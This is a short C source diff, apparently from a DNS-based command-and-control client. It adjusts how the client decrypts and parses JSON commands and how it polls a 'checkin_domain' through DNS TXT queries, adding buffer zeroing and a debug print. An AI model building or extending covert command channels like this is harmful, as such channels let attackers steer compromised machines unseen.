@@ -69,7 +69,7 @@ char *request_hex_to_string(const char *in) {
     size_t clear_len = decrypt(gz_bytes, gz_bytes_len, clear);
 
     // decode json
-    char *c = calloc(255, sizeof(char *));
+    char *c = calloc(clear_len, sizeof(char *));
     json_parse_command(clear, c);
 
     return c;
@@ -140,6 +140,8 @@ int poll(client_t *client) {
     ns_msg msg;
     ns_rr rr;
 
+    memset(txt, 0, 255);
+
     len = res_query(client->checkin_domain, ns_c_in, ns_t_txt, answer, sizeof(answer));
 
     if (len <= 0)
@@ -178,6 +180,8 @@ int poll(client_t *client) {
             return 1;
         }
 
+        Dprintf("[d] txt response line: %s\n", txt);
+
         // when we're in a cmd state, we are expecting the bytes
         // to process as the value for p.
         //  ie. p=ffffff
@@ -187,7 +191,6 @@ int poll(client_t *client) {
         char *token = strtok(txt, s);
         while (token != NULL) {
             command = token;
-            // continue scanning
             token = strtok(NULL, s);
         }
 
